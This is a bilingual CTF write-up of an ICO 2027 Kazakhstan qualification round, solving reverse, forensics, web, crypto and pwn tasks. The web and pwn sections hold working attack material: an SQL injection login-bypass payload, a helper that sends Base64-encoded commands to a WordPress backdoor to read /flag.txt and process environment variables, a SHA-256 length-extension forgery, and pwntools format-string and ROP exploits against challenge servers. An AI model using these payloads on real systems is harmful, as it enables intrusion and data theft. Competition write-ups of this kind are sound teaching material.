# ICO 2027 Qualifications CTF Writeups

<p align="center">
  <a href="#english">English</a> | <a href="#russian">Русский</a>
</p>

I wrote this writeup from my own POV: what I checked, what I noticed, what tools I used, and why each solution worked.

---

<a id="english"></a>

# English

## 0. Context and Glossary

`ICO` stands for `International Cybersecurity Olympiad`. It is an international cybersecurity competition for students. The Kazakhstan qualification round was a `CTF` in Jeopardy format.

`CTF` stands for `Capture The Flag`. In cybersecurity, a flag is a secret string hidden inside a task.

The usual flag format here was:

```text
ICO{something_here}
ico{something_here}
```

`Jeopardy-style CTF` means there are many separate tasks from different categories. Each task gives points and one or more flags.

| Category | Meaning | Explanation |
|---|---|---|
| Web | Web security | Websites, login forms, APIs, cookies, WordPress, and authorization bugs. |
| Crypto | Cryptography | Weak hashes, signatures, random generators, or encryption logic. |
| Reverse / Rev | Reverse engineering | Understanding a program without having the original clean source code. |
| Forensics | Digital forensics | Files, images, audio, metadata, PCAPs, and hidden data. |
| Pwn | Binary exploitation | Exploiting compiled programs, usually memory bugs. |

Terms I used a lot there:

| Term | Meaning |
|---|---|
| API | Application Programming Interface. A way for programs to talk to programs. |
| JSON | JavaScript Object Notation. A structured text format like `{"ok":true}`. |
| SQL | Structured Query Language. The language used by databases. |
| SQLi | SQL injection. A bug where my input changes the database query. |
| RCE | Remote Code Execution. A bug where I can run commands on a remote server. |
| PRNG | Pseudo-Random Number Generator. It looks random, but it follows rules. |
| LCG | Linear Congruential Generator. A simple PRNG formula. |
| EXIF | Metadata inside images, like GPS coordinates or comments. |
| PCAP | Packet capture file with saved network traffic. |
| ROP | Return-Oriented Programming. A pwn technique using small code snippets already inside a binary. |
| MAC | Message Authentication Code. A signature/tag for a message. |
| SHA-256 | A hash algorithm that outputs 256 bits, usually 64 hex characters. |
| HMAC | A safe keyed-hash construction that prevents length-extension attacks. |

Tools I used:

| Tool | Why I used it |
|---|---|
| `file` | Checks real file type using magic bytes. |
| `strings` | Extracts readable text from files/binaries. |
| `xxd` / `od` | Shows raw bytes in hex. |
| `base64` | Decodes Base64 text. |
| `curl` | Sends exact HTTP requests. |
| Browser DevTools | Inspects HTML, JavaScript, cookies, and requests. |
| `nc` | Netcat, used to connect to raw TCP services. |
| Python | Automation, math, decoding, and exploits. |
| pwntools | Python library for pwn challenges. |
| `tshark` / Wireshark | Reads PCAP network traffic. |
| `zsteg` | Finds hidden data in image bit planes. |
| Ghidra / objdump | Reverse-engineering compiled binaries. |

## Final Results

| # | Task | Category | Result |
|---:|---|---|---|
| 1 | Rev Zero | Reverse | `ico{R3v3R$3_fR0m_Z3r0}` |
| 2 | Wolf Protocol | Reverse | `ico{w0lves_see_th3_h1dd3n_truth_42}` |
| 3 | Can you hear the flag? | Forensics | `ico{a7f3c91e2b6d48f5c0a19d83e72b4f61}` |
| 4 | Five Shards | Forensics | `ico{5h4rd5_4r3_b3tt3r_t0g3th3r!}` |
| 5 | NorthStar | Web | `ico{721427dd34030ef0c0458d1e5067395e}` |
| 6 | Backdoor | Web / WordPress | `ico{7519ee9f05a6a11ca96cc044c971b6ae}` |
| 7 | PixelMart | Crypto / PRNG | `ICO{f1gur3_1t_0ut_y0urs3lf_th3n_3xpl0it}` |
| 8 | VIP Club | Crypto | I forgot to note this flag |
| 9 | Journal Operator | Pwn | `ICO{str1pp3d_but_st1ll_wr1t3abl3}` |
| 10 | AEZAKMI | Pwn | `ICO{n0_symb0ls_st1ll_p0pp3d_rd1}` |

During Backdoor I also found an extra environment flag:

```text
ico{258da6df9fcf12cf110d42dd77d7937f}
```

---

## 1. Rev Zero

### Challenge

![Task Description](/ico_qualifying_round/tasks/rev_zero.webp)

```text
The terminal is locked. The code is right in front of you.
```

This was a reverse-engineering task. The main trick was that the check was in JavaScript. If the browser receives the JavaScript, then the logic is not secret.

### What I found

The important code was:

```javascript
if (btoa(input.split('').reverse().join('')) === 'fTByM1pfbTBSZl8zJFIzdjNSe29jaQ==') {
    // correct
}
```

Line by line:

| Code | Meaning |
|---|---|
| `input.split('')` | Splits my input into characters. |
| `.reverse()` | Reverses those characters. |
| `.join('')` | Joins them back into a string. |
| `btoa(...)` | Base64-encodes the string. |
| `===` | Compares with the hardcoded value. |

So the app does:

```text
input -> reverse -> Base64 -> compare
```

To solve it, I do the opposite:

```text
hardcoded Base64 -> decode -> reverse
```

### Manual solve

```bash
echo 'fTByM1pfbTBSZl8zJFIzdjNSe29jaQ==' | base64 -d
```

Output:

```text
}0r3Z_m0Rf_3$R3v3R{oci
```

This is obviously the flag backwards. Reversing it gives:

```text
ico{R3v3R$3_fR0m_Z3r0}
```

### Python solver

```python
import base64

encoded = "fTByM1pfbTBSZl8zJFIzdjNSe29jaQ=="
decoded = base64.b64decode(encoded).decode()
flag = decoded[::-1]
print(flag)
```

Explanation:

| Line | Explanation |
|---|---|
| `import base64` | Loads Python's Base64 helper. |
| `encoded = ...` | Stores the hardcoded value. |
| `base64.b64decode(encoded)` | Decodes Base64 back to bytes. |
| `.decode()` | Turns bytes into text. |
| `[::-1]` | Reverses the string. |
| `print(flag)` | Prints the flag. |

### Flag

```text
ico{R3v3R$3_fR0m_Z3r0}
```

---

## 2. Wolf Protocol

### Challenge

![Task Description](/ico_qualifying_round/tasks/wolf_protocol.webp)

```text
The binary speaks only one language. Are you fluent?
```

This was a reverse-engineering binary task. A `binary` is a compiled program, so I had to recover the algorithm from the program logic.

### Main idea

The binary transformed every byte of the flag using three reversible steps:

1. S-box substitution.
2. XOR with a generated key byte.
3. Rotate bits left.

An `S-box` is a substitution table. `XOR` is reversible because `x ^ k ^ k = x`. A rotate-left operation can be undone with rotate-right.

### Constants I recovered

```python
MULTIPLIER = 6364136223846793005
INCREMENT = 1442695040888963407
MASK64 = (1 << 64) - 1

SBOX_SEED = 0xDEADBEEF13370042
KEY_SEED = 0xBEEFCAFE0BADF00D

TARGET = bytes([
    32, 79, 206, 17, 115, 221, 115, 78, 80, 114, 43, 141,
    201, 26, 244, 130, 98, 168, 126, 73, 184, 202, 206,
    66, 111, 100, 174, 217, 170, 90, 69, 160, 184, 66, 192,
])
```

The checker was equivalent to:

```text
cipher_byte = rol8(sbox[plain_byte] ^ key_byte, rotation)
```

So I reversed it as:

```text
plain_byte = inverse_sbox[ror8(cipher_byte, rotation) ^ key_byte]
```

### Solver

```python
MULTIPLIER = 6364136223846793005
INCREMENT = 1442695040888963407
MASK64 = (1 << 64) - 1

SBOX_SEED = 0xDEADBEEF13370042
KEY_SEED = 0xBEEFCAFE0BADF00D

TARGET = bytes([
    32, 79, 206, 17, 115, 221, 115, 78, 80, 114, 43, 141,
    201, 26, 244, 130, 98, 168, 126, 73, 184, 202, 206,
    66, 111, 100, 174, 217, 170, 90, 69, 160, 184, 66, 192,
])


def lcg_next(state):
    return (state * MULTIPLIER + INCREMENT) & MASK64


def ror8(value, amount):
    amount &= 7
    return ((value >> amount) | (value << (8 - amount))) & 0xff


def build_sbox():
    sbox = list(range(256))
    state = SBOX_SEED
    for i in range(255, 0, -1):
        state = lcg_next(state)
        j = state % (i + 1)
        sbox[i], sbox[j] = sbox[j], sbox[i]
    return sbox


def build_key(length):
    state = KEY_SEED
    key = []
    for _ in range(length):
        state = lcg_next(state)
        key.append((state >> 24) & 0xff)
    return key


sbox = build_sbox()
inverse_sbox = [0] * 256

for original, substituted in enumerate(sbox):
    inverse_sbox[substituted] = original

key = build_key(len(TARGET))
flag = []

for i, target_byte in enumerate(TARGET):
    rotation = (i % 7) + 1
    byte = ror8(target_byte, rotation) ^ key[i]
    flag.append(inverse_sbox[byte])

print(bytes(flag).decode())
```

Important lines:

| Line | Meaning |
|---|---|
| `lcg_next` | Recreates the pseudo-random generator. |
| `& MASK64` | Keeps values inside 64-bit overflow. |
| `build_sbox()` | Rebuilds the same shuffled S-box. |
| `build_key()` | Rebuilds the same key stream. |
| `inverse_sbox` | Lets me undo the substitution. |
| `ror8(...) ^ key[i]` | Undoes rotate-left and XOR. |

### Flag

```text
ico{w0lves_see_th3_h1dd3n_truth_42}
```

---

## 3. Can you hear the flag?

### Challenge

![Task Description](/ico_qualifying_round/tasks/can_you_hear_the_flag.webp)

```text
Just a picture. Nothing to see here.
```

The title says “hear”, but the description says “picture”. That mismatch is the hint. I treated the image as a container that could hide audio.

This is forensics/steganography. `Steganography` means hiding data inside another file.

### Steps

First I checked the real file type:

```bash
file file-a.jpg
```

Then I searched for readable hints:

```bash
strings -a file-a.jpg | grep -iE 'ico|flag|ctf|wav|sound|audio|hint'
```

Then I checked for embedded files:

```bash
binwalk file-a.jpg
binwalk -e file-a.jpg
```

`binwalk` scans for file signatures inside another file. If a WAV/audio file is appended after the image, it can detect it.

After extracting the hidden audio, I converted it to a spectrogram:

```bash
ffmpeg -i hidden.wav -lavfi showspectrumpic=s=1600x900 spectrogram.png
```

Alternative:

```bash
sox hidden.wav -n spectrogram -o spectrogram.png
```

A `spectrogram` is an image of sound:

| Direction | Meaning |
|---|---|
| left to right | time |
| bottom to top | frequency |
| brightness/color | volume/intensity |

The flag was visible in the spectrogram.

### Flag

```text
ico{a7f3c91e2b6d48f5c0a19d83e72b4f61}
```

---

## 4. Five Shards

### Challenge

![Task Description](/ico_qualifying_round/tasks/five_shards.webp)

```text
The flag was shattered across five files. Each shard is a piece of a larger puzzle - but not every file is what it seems, and not every secret is obvious.
Find them all. Put them together.
```

The folder contained:

```text
corrupted.wav
noise.png
photo.jpg
readme.txt
traffic.pcap
```

The name says five shards, so I inspected every file.

### Step 1 - identify file types

```bash
file corrupted.wav noise.png photo.jpg readme.txt traffic.pcap
```

Important result:

```text
corrupted.wav: compiled Java class data
noise.png: PNG image data, 800 x 400, 8-bit/color RGB
photo.jpg: JPEG image data, Exif metadata
readme.txt: ASCII text
traffic.pcap: pcap capture file
```

`corrupted.wav` was suspicious because a WAV should normally start with `RIFF`.

### Step 2 - README

The README had Base64 text:

```bash
echo 'Tm90aGluZyB0byBzZWUgaGVyZS4gVGhpcyBpcyBhIHJlZCBoZXJyaW5nLgpUaGUgZmxhZyBpcyBub3QgaW4gdGhpcyBmaWxlLgpIaW50OiBmaXZlIGZpbGVzLCBmaXZlIHNoYXJkcywgb25lIHRydXRoLg==' | base64 -d
```

Output:

```text
Nothing to see here. This is a red herring.
The flag is not in this file.
Hint: five files, five shards, one truth.
```

A `red herring` is a distraction, but this still confirmed the structure.

### Step 3 - fix the WAV

I checked the header:

```bash
xxd -l 32 corrupted.wav
```

The first bytes were:

```text
ca fe ba be de ad c0 de 52 49 46 46 34 b1 02 00
57 41 56 45 66 6d 74 20
```

Meaning:

| Bytes | Meaning |
|---|---|
| `ca fe ba be` | Java class magic bytes. |
| `de ad c0 de` | Fake/junk marker. |
| `52 49 46 46` | ASCII `RIFF`, the real WAV header. |
| `57 41 56 45` | ASCII `WAVE`. |

So I removed the first 8 junk bytes:

```bash
tail -c +9 corrupted.wav > fixed.wav
file fixed.wav
```

`tail -c +9` starts from byte 9. Bytes 1-8 were fake, byte 9 starts the real WAV.

### Step 4 - photo metadata

```bash
exiftool photo.jpg
```

Important clues:

```text
The 13th step reveals the truth
Somewhere high in the Caucasus
GPS: 43°20'59.640"N, 42°26'43.080"E
Altitude: 5642m
```

The GPS and altitude point to Mount Elbrus. The phrase “13th step” hints at `ROT13`.

`ROT13` shifts letters by 13 positions. Applying ROT13 twice gives the original text.

```python
import codecs
print(codecs.decode("vpb", "rot_13"))
```

Output:

```text
ico
```

### Step 5 - PCAP DNS shard

```bash
tshark -r traffic.pcap -Y dns -T fields -e dns.qry.name | sort -u
```

The DNS queries contained ordered pieces:

```text
000-UOO5LRPL.shard4.ctf
001-YX2KZLWL.shard4.ctf
002-4WFKZHU7.shard4.ctf
003-XT4YVTUN.shard4.ctf
004-VTZLJ3VN.shard4.ctf
005-ZXHNN3O7.shard4.ctf
006-4GRQ====.shard4.ctf
```

I removed the indexes and domain, then joined the labels:

```text
UOO5LRPLYX2KZLWL4WFKZHU7XT4YVTUNVTZLJ3VNZXHNN3O74GRQ====
```

That is Base32:

```python
import base64

s = "UOO5LRPLYX2KZLWL4WFKZHU7XT4YVTUNVTZLJ3VNZXHNN3O74GRQ===="
raw = base64.b32decode(s)
print(raw.hex())
```

Output:

```text
a39dd5c5ebc5f4acaecbe58aac9e9fbcf98ace8dacf2b4eeadcdced6eddfe1a3
```

### Step 6 - noise.png

I used `zsteg`:

```bash
zsteg -a noise.png
```

The real lead was:

```text
b4,g,lsb,xy .. file: zlib compressed data
```

Meaning:

| Part | Meaning |
|---|---|
| `b4` | bit plane 4 |
| `g` | green channel |
| `lsb` | least significant bit order |
| `xy` | read pixels left-to-right/top-to-bottom |
| `zlib` | compressed data |

I extracted and decompressed it:

```bash
zsteg -E b4,g,lsb,xy noise.png > noise_shard.zlib
python3 - <<'PY'
import zlib
raw = open("noise_shard.zlib", "rb").read()
print(zlib.decompress(raw))
PY
```

After extracting all pieces and applying the hints, the assembled flag was:

```text
ico{5h4rd5_4r3_b3tt3r_t0g3th3r!}
```

---

## 5. NorthStar

### Challenge

![ Task Description](/ico_qualifying_round/tasks/northstar.webp)

```text
For years, Northstar Systems guided critical deployments across the globe. After a sudden breach locked the operations center, the company’s internal portal was taken offline. Rumors suggest the attackers left two flags behind: one buried in the authentication system, and another hidden within the deployment infrastructure.
https://task1.cyberolympiad.kz
```

This was a web challenge. The phrase “authentication system” made me focus on login first.

### SQL injection

The working payload was:

```text
username=' OR 1=1-- -
password=x
```

A vulnerable login query might be:

```sql
SELECT * FROM users
WHERE username = '$username'
AND password = '$password';
```

With my input, it becomes like:

```sql
SELECT * FROM users
WHERE username = '' OR 1=1-- -'
AND password = 'x';
```

Explanation:

| Part | Meaning |
|---|---|
| `'` | closes the original SQL string |
| `OR 1=1` | always true condition |
| `-- -` | comments out the rest of the query |

### Reproduce with curl

```bash
BASE='https://task1.cyberolympiad.kz'

curl -sk -i -X POST "$BASE/login" \
  --data-urlencode "username=' OR 1=1-- -" \
  --data-urlencode "password=x"
```

After bypassing login, I got the dashboard flag.

### Flag

```text
ico{721427dd34030ef0c0458d1e5067395e}
```

---

## 6. Backdoor

### Challenge

![ Task Description](/ico_qualifying_round/tasks/backdoor.webp)

```text
Once a thriving community blog, this WordPress site was abandoned after its administrator vanished without a trace. The site remains online, filled with forgotten posts and an oddly persistent plugin installed by the last person to access the dashboard.
Explore the site, uncover its weaknesses, and find the flags hidden behind the administrator’s account and on the system.
https://task2.cyberolympiad.kz
```

This was a WordPress challenge. `WordPress` is a CMS, meaning Content Management System. A `plugin` is extra PHP code installed into WordPress. The phrase “persistent plugin” made me look for custom REST routes and must-use plugins.

### REST API enumeration

```bash
BASE='https://task2.cyberolympiad.kz'

curl -sk "$BASE/wp-json/" | python3 -m json.tool
curl -sk "$BASE/wp-json/wp/v2/users" | python3 -m json.tool
```

I found user:

```text
sp3c1al
```

And I found the custom route:

```text
/wp-json/wp2shell/v1/f8b000a326e88105cb84a05c
```

The name `wp2shell` strongly suggested a command-execution backdoor.

### Backdoor protocol

The route expected JSON with a Base64 command in field `c`:

```json
{"c":"BASE64_COMMAND_HERE"}
```

I made a helper:

```bash
BASE='https://task2.cyberolympiad.kz'
ROUTE='/wp-json/wp2shell/v1/f8b000a326e88105cb84a05c'

run_cmd() {
  cmd="$1"
  b64="$(printf '%s' "$cmd" | base64 -w0)"
  curl -sk -X POST "$BASE$ROUTE" \
    -H 'Content-Type: application/json' \
    -d "{\"c\":\"$b64\"}"
}
```

Line by line:

| Line | Explanation |
|---|---|
| `cmd="$1"` | takes the command passed to the function |
| `printf '%s' "$cmd"` | prints it exactly, without newline |
| `base64 -w0` | encodes it as one Base64 line |
| `curl -X POST` | sends a POST request |
| `Content-Type: application/json` | tells the server I am sending JSON |
| `-d ...` | sends the JSON body |

I confirmed RCE:

```bash
run_cmd 'id'
```

Then I read the system flag:

```bash
run_cmd 'cat /flag.txt'
```

Flag:

```text
ico{7519ee9f05a6a11ca96cc044c971b6ae}
```

### Extra environment flag

I searched WordPress files:

```bash
run_cmd 'find /var/www/html -maxdepth 4 -type f -name "*.php" 2>/dev/null | grep -Ei "mu-plugins|flag|shell|plugin"'
```

Interesting file:

```text
wp-content/mu-plugins/flag-plugin.php
```

Then I checked environment variables:

```bash
run_cmd "tr '\0' '\n' < /proc/self/environ | grep -E 'FLAG|USER_FLAG|ico'"
```

`/proc/self/environ` stores environment variables for the current process. They are separated by null bytes, so `tr '\0' '\n'` turns them into readable lines.

Extra flag:

```text
ico{258da6df9fcf12cf110d42dd77d7937f}
```

---

## 7. PixelMart

### Challenge

![ Task Description](/ico_qualifying_round/tasks/pixelmart.webp)

```text
The online store "PixelMart" gives out bonus codes using its own random generator and prides itself on its integrity.
Join us and see if it's really that hard to predict.
nc 94.131.84.228 33007
```

This was a PRNG challenge. The service gave several outputs and asked me to predict future bonus codes.

### Given values

```text
m = 4294967296
hidden_bits = 16
x0 = 3398650787
x1 = 3458068990
x2_top = 54800
x3 = 27663828
rounds = 20
```

`m = 4294967296 = 2^32`, so it looked like a 32-bit LCG.

The LCG formula is:

```text
x[n+1] = (a * x[n] + c) mod m
```

I knew `x0`, `x1`, `x3`, but only the top 16 bits of `x2`. The lower 16 bits have only `65536` possibilities, so brute force is fine.

### Solver

```python
m = 2**32
hidden_bits = 16

x0 = 3398650787
x1 = 3458068990
x2_top = 54800
x3 = 27663828


def next_value(x, a, c):
    return (a * x + c) % m


for lower in range(1 << hidden_bits):
    x2 = (x2_top << hidden_bits) | lower

    try:
        a = ((x2 - x1) * pow(x1 - x0, -1, m)) % m
    except ValueError:
        continue

    c = (x1 - a * x0) % m

    if next_value(x2, a, c) == x3:
        print("lower =", lower)
        print("x2 =", x2)
        print("a =", a)
        print("c =", c)
        break
```

Output:

```text
lower = 32441
x2 = 3591405241
a = 274874657
c = 646369019
```

Then I predicted 20 values:

```python
m = 2**32
a = 274874657
c = 646369019
x = 27663828

for _ in range(20):
    x = (a * x + c) % m
    print(x)
```

Predictions:

```text
900430671
3224290090
573546853
3209642496
864047355
246872662
3063474705
774720556
2207042727
2744227714
1401379005
282803288
2529947219
3390675630
3400920425
3950252676
1337505279
4012508122
3210717205
3281178288
```

After sending these predictions, I got the flag.

### Flag

```text
ICO{f1gur3_1t_0ut_y0urs3lf_th3n_3xpl0it}
```

---

## 8. VIP Club

### Challenge

![ Task Description](/ico_qualifying_round/tasks/vip_club.webp)

```text
A private club issues guest passes based on a secret known only to them. You've been given a standard guest pass - enter as an admin.
nc 94.131.84.228 33006
```

The server printed:

```text
data0 = 757365723d6775657374266c6576656c3d6261736963
token0 = e5e16bd00e210a057d9a0fc98d92b8b52ffad64c92b4ca3cd6fc15648011594a
```

I decoded the hex data:

```python
data0 = bytes.fromhex("757365723d6775657374266c6576656c3d6261736963")
print(data0)
```

Output:

```text
b'user=guest&level=basic'
```

So the goal was to change `level=basic` into admin access.

### Vulnerability: SHA-256 length extension

The weak signing pattern is:

```text
token = sha256(secret || message)
```

If I know `message`, the digest, and I can guess the secret length, SHA-256 lets me continue hashing and append extra data.

The safer version is:

```text
HMAC-SHA256(secret, message)
```

HMAC prevents this attack.

### Forged data

Original message:

```text
user=guest&level=basic
```

Appended data:

```text
&level=admin
```

The accepted forged data was:

```text
757365723d6775657374266c6576656c3d6261736963800000000000000000000000000000000000000000000140266c6576656c3d61646d696e
```

The accepted token was:

```text
a97ae0b7c03ac5a0ec752a0c710e8a71354f2386306b5824210a06cd1903ce20
```

The padding ends with `0140`, which is `0x140 = 320` bits. That means `40` bytes total before padding. The original message was `22` bytes, so the secret length was `18` bytes.

### Final command

```bash
printf "S 757365723d6775657374266c6576656c3d6261736963800000000000000000000000000000000000000000000140266c6576656c3d61646d696e a97ae0b7c03ac5a0ec752a0c710e8a71354f2386306b5824210a06cd1903ce20\n" | nc 94.131.84.228 33006
```

Explanation:

| Part | Meaning |
|---|---|
| `printf` | Sends exactly one line. |
| `S` | Submit command accepted by the service. |
| first hex value | Forged data with SHA-256 glue padding and `&level=admin`. |
| second hex value | Forged SHA-256 token. |
| `\n` | Newline so the server processes the command. |
| `nc ... 33006` | Connects to the challenge service. |

The service accepted the forged admin pass and returned the VIP Club flag.

---

## 9. Journal Operator

### Challenge

![ Task Description](/ico_qualifying_round/tasks/journal_operator.webp)

```text
The program keeps a transaction log. Regular users are not allowed to use it - the service itself informs them of this upon login.
nc 94.131.84.228 33102
```

This was a pwn task with a format-string bug.

The unsafe C pattern is:

```c
printf(user_input);
```

The safe version is:

```c
printf("%s", user_input);
```

With the unsafe version, my input can contain format specifiers like `%p`, `%x`, `%s`, and `%n`.

`%n` is powerful because it writes the number of printed characters into an address.

Target variable:

```text
is_admin = 0x40407c
```

I needed to write `1` there.

### Exploit

```python
from pwn import *

context.arch = "amd64"

HOST = "94.131.84.228"
PORT = 33102
IS_ADMIN = 0x40407c

io = remote(HOST, PORT)
io.recvuntil(b"> ")

payload = fmtstr_payload(6, {IS_ADMIN: 1}, write_size="byte")
print(payload.hex())

io.sendline(payload)
io.interactive()
```

Explanation:

| Line | Meaning |
|---|---|
| `context.arch = "amd64"` | 64-bit x86 target. |
| `remote(HOST, PORT)` | Connect to the service. |
| `recvuntil(b"> ")` | Wait for the input prompt. |
| `fmtstr_payload(...)` | Build a format-string write. |
| `6` | Stack offset where my controlled argument is. |
| `{IS_ADMIN: 1}` | Write `1` to `0x40407c`. |
| `write_size="byte"` | Write one byte, enough for true/false. |

Output:

```text
is_admin = 1
Доступ администратора подтверждён. ICO{str1pp3d_but_st1ll_wr1t3abl3}
```

### Flag

```text
ICO{str1pp3d_but_st1ll_wr1t3abl3}
```

---

## 10. AEZAKMI

### Challenge

![Task Description](/ico_qualifying_round/tasks/aezakmi.webp)

```text
An old arcade machine is asking for a name for its high score table.
nc 94.131.84.228 33101
```

This was a stack buffer overflow with ROP.

`AEZAKMI` is a GTA cheat-code reference. The binary also used a magic value:

```text
0x1337c0de
```

On Linux x86-64, the first function argument goes in the `rdi` register. So if the hidden function is like:

```c
void win(long code) {
    if (code == 0x1337c0de) {
        print_flag();
    }
}
```

I need to call:

```text
win(0x1337c0de)
```

That means:

```text
rdi = 0x1337c0de
rip = win
```

### Values

```text
OFFSET = 0x48
POP_RDI = 0x401306
RET = 0x401307
WIN = 0x40123d
MAGIC = 0x1337c0de
```

### Exploit

```python
from pwn import *

HOST = "94.131.84.228"
PORT = 33101

OFFSET = 0x48
POP_RDI = 0x401306
RET = 0x401307
WIN = 0x40123d
MAGIC = 0x1337c0de

payload = b"A" * OFFSET
payload += p64(RET)
payload += p64(POP_RDI)
payload += p64(MAGIC)
payload += p64(WIN)

io = remote(HOST, PORT)
io.recvuntil("Введите имя".encode())
io.sendline(payload)
io.interactive()
```

Payload layout:

```text
'A' * 0x48
RET
POP_RDI
0x1337c0de
WIN
```

What happens:

1. `A * 0x48` reaches the saved return address.
2. `RET` aligns the stack.
3. `POP_RDI` loads `0x1337c0de` into `rdi`.
4. The program jumps to `WIN`.
5. `WIN` sees the correct magic and prints the flag.

Output:

```text
Верный чит-код! ICO{n0_symb0ls_st1ll_p0pp3d_rd1}
```

### Flag

```text
ICO{n0_symb0ls_st1ll_p0pp3d_rd1}
```

<p align="center"><a href="#ico-2027-qualifications-ctf-writeups">Back to top</a></p>

---

<a id="russian"></a>

# Русский

## 0. Контекст и словарь

`ICO` расшифровывается как `International Cybersecurity Olympiad`, то есть Международная олимпиада по кибербезопасности. Отборочный этап Казахстана проходил в формате `CTF - Jeopardy`.

`CTF` значит `Capture The Flag`, то есть “захвати флаг”. В CTF флаг - это секретная строка внутри задания.

Формат флагов был примерно такой:

```text
ICO{something_here}
ico{something_here}
```

| Категория | Что значит | Объяснение |
|---|---|---|
| Web | Веб-безопасность | Сайты, логины, API, cookies, WordPress и проблемы доступа. |
| Crypto | Криптография | Слабые хеши, подписи, генераторы случайных чисел или шифрование. |
| Reverse / Rev | Реверс | Понять программу без нормального исходного кода. |
| Forensics | Форензика | Файлы, картинки, аудио, метаданные, PCAP и скрытые данные. |
| Pwn | Эксплуатация бинарников | Ломаем скомпилированные программы через ошибки памяти. |

Словарь:

| Термин | Объяснение |
|---|---|
| API | Интерфейс, через который программы общаются друг с другом. |
| JSON | Текстовый формат данных, например `{"ok":true}`. |
| SQL | Язык запросов к базе данных. |
| SQLi | SQL-инъекция. Баг, когда мой ввод меняет SQL-запрос. |
| RCE | Remote Code Execution. Возможность выполнить команду на сервере. |
| PRNG | Псевдослучайный генератор. Выглядит случайно, но работает по формуле. |
| LCG | Linear Congruential Generator. Простой PRNG с формулой `x[n+1] = (a*x[n] + c) mod m`. |
| EXIF | Метаданные внутри фото: GPS, комментарии, камера и т.д. |
| PCAP | Файл с сохраненным сетевым трафиком. |
| ROP | Return-Oriented Programming. Цепочка маленьких кусков кода из бинарника. |
| MAC | Подпись/тег сообщения. |
| SHA-256 | Хеш-алгоритм, который дает 64 hex-символа. |
| HMAC | Безопасная схема подписи на основе хеша. |

Инструменты:

| Инструмент | Зачем использовала |
|---|---|
| `file` | Узнать настоящий тип файла. |
| `strings` | Достать читаемый текст. |
| `xxd` / `od` | Посмотреть байты в hex. |
| `base64` | Декодировать Base64. |
| `curl` | Отправлять HTTP-запросы. |
| DevTools | Смотреть HTML, JS, cookies и запросы. |
| `nc` | Netcat, подключение к TCP-сервисам. |
| Python | Автоматизация, математика и эксплойты. |
| pwntools | Python-библиотека для pwn. |
| `tshark` / Wireshark | Анализ PCAP. |
| `zsteg` | Скрытые данные в картинках. |
| Ghidra / objdump | Анализ бинарников. |

## Итоги

| # | Задача | Категория | Результат |
|---:|---|---|---|
| 1 | Rev Zero | Reverse | `ico{R3v3R$3_fR0m_Z3r0}` |
| 2 | Wolf Protocol | Reverse | `ico{w0lves_see_th3_h1dd3n_truth_42}` |
| 3 | Can you hear the flag? | Forensics | `ico{a7f3c91e2b6d48f5c0a19d83e72b4f61}` |
| 4 | Five Shards | Forensics | `ico{5h4rd5_4r3_b3tt3r_t0g3th3r!}` |
| 5 | NorthStar | Web | `ico{721427dd34030ef0c0458d1e5067395e}` |
| 6 | Backdoor | Web / WordPress | `ico{7519ee9f05a6a11ca96cc044c971b6ae}` |
| 7 | PixelMart | Crypto / PRNG | `ICO{f1gur3_1t_0ut_y0urs3lf_th3n_3xpl0it}` |
| 8 | VIP Club | Crypto | Забыла записать сам флаг |
| 9 | Journal Operator | Pwn | `ICO{str1pp3d_but_st1ll_wr1t3abl3}` |
| 10 | AEZAKMI | Pwn | `ICO{n0_symb0ls_st1ll_p0pp3d_rd1}` |

В Backdoor еще был найден дополнительный environment-флаг:

```text
ico{258da6df9fcf12cf110d42dd77d7937f}
```

---

## 1. Rev Zero

### Условие

![Task Description](/ico_qualifying_round/tasks/rev_zero.webp)

```text
The terminal is locked. The code is right in front of you.
```

Это reverse-задача. Тут проверка была прямо в JavaScript, а JavaScript в браузере не секрет.

### Что я нашел

```javascript
if (btoa(input.split('').reverse().join('')) === 'fTByM1pfbTBSZl8zJFIzdjNSe29jaQ==') {
    // correct
}
```

Разбор:

| Код | Что делает |
|---|---|
| `input.split('')` | Делит ввод на символы. |
| `.reverse()` | Переворачивает символы. |
| `.join('')` | Собирает обратно в строку. |
| `btoa(...)` | Кодирует в Base64. |
| `===` | Сравнивает с готовой строкой. |

Значит, программа делает:

```text
input -> reverse -> Base64 -> compare
```

Я делаю наоборот:

```text
Base64 -> decode -> reverse
```

### Решение

```bash
echo 'fTByM1pfbTBSZl8zJFIzdjNSe29jaQ==' | base64 -d
```

Вывод:

```text
}0r3Z_m0Rf_3$R3v3R{oci
```

Это флаг задом наперед. Переворачиваю:

```text
ico{R3v3R$3_fR0m_Z3r0}
```

### Python

```python
import base64

encoded = "fTByM1pfbTBSZl8zJFIzdjNSe29jaQ=="
decoded = base64.b64decode(encoded).decode()
flag = decoded[::-1]
print(flag)
```

### Флаг

```text
ico{R3v3R$3_fR0m_Z3r0}
```

---

## 2. Wolf Protocol

### Условие

![Task Description](/ico_qualifying_round/tasks/wolf_protocol.webp)

```text
The binary speaks only one language. Are you fluent?
```

Это reverse-задача с бинарником. Бинарник - это скомпилированная программа, поэтому я восстанавливал алгоритм по логике.

### Идея

Программа делала над каждым байтом:

1. S-box замену.
2. XOR с байтом ключа.
3. Rotate left.

Все это обратимо. S-box можно инвертировать, XOR отменяется тем же XOR, rotate left отменяется rotate right.

### Константы и скрипт

```python
MULTIPLIER = 6364136223846793005
INCREMENT = 1442695040888963407
MASK64 = (1 << 64) - 1

SBOX_SEED = 0xDEADBEEF13370042
KEY_SEED = 0xBEEFCAFE0BADF00D

TARGET = bytes([
    32, 79, 206, 17, 115, 221, 115, 78, 80, 114, 43, 141,
    201, 26, 244, 130, 98, 168, 126, 73, 184, 202, 206,
    66, 111, 100, 174, 217, 170, 90, 69, 160, 184, 66, 192,
])


def lcg_next(state):
    return (state * MULTIPLIER + INCREMENT) & MASK64


def ror8(value, amount):
    amount &= 7
    return ((value >> amount) | (value << (8 - amount))) & 0xff


def build_sbox():
    sbox = list(range(256))
    state = SBOX_SEED
    for i in range(255, 0, -1):
        state = lcg_next(state)
        j = state % (i + 1)
        sbox[i], sbox[j] = sbox[j], sbox[i]
    return sbox


def build_key(length):
    state = KEY_SEED
    key = []
    for _ in range(length):
        state = lcg_next(state)
        key.append((state >> 24) & 0xff)
    return key


sbox = build_sbox()
inverse_sbox = [0] * 256
for original, substituted in enumerate(sbox):
    inverse_sbox[substituted] = original

key = build_key(len(TARGET))
flag = []

for i, target_byte in enumerate(TARGET):
    rotation = (i % 7) + 1
    byte = ror8(target_byte, rotation) ^ key[i]
    flag.append(inverse_sbox[byte])

print(bytes(flag).decode())
```

### Флаг

```text
ico{w0lves_see_th3_h1dd3n_truth_42}
```

---

